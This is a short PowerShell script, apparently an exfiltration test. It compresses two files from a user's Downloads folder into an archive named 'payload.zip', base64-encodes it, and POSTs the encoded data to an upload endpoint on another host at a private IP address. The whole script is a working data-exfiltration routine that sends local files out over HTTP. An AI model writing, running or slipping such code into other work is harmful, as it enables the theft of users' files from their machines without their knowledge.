Compress-Archive `
    -Path "C:\Users\semne\Downloads\file1.txt",
          "C:\Users\semne\Downloads\file2.txt" `
    -DestinationPath "C:\Users\semne\Downloads\HarmlessFolder\payload.zip"

$file = [System.IO.File]::ReadAllBytes("C:\Users\semne\Downloads\HarmlessFolder\payload.zip")
$encoded = [Convert]::ToBase64String($file)
#$encoded | Set-Content "C:\Users\semne\Downloads\HarmlessFolder\encoded.txt" -NoNewline


#$encodedText = Get-Content "C:\Users\semne\Downloads\HarmlessFolder\encoded.txt"
#Write-Output = $encodedText

Invoke-WebRequest `
    -Uri "http://192.168.1.3:5000/upload" `
    -Method POST `
    -Body $encoded`
    -ContentType "text/plain"
